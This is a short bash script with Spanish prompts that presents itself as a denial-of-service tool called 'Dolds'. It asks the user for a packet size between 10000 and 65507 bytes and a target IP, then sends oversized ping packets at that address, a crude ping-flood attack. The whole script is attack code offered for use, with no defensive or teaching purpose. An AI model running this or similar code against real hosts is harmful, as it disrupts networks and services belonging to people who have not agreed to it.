bash .banner
echo "Introduce el peso de los paquetes de tu dos (10000-65507)"
read input
bash .banner
echo "Introduce la ip que deseas hacer Dos:"
read input1
bash .banner
echo "Antes de continuar echale un vistaso a las instrucciones:"
echo ""
cat Readme.txt
echo "Presiona una tecla para continuar..."
read input2
bash .banner
echo "Dolds esta trabajando si es que no se envian los paquetes es"
echo "porque el usuario o esta desconectado o no es vulnerable a este"
echo "tipo de ataque..."
echo ""
ping -s $input $input1
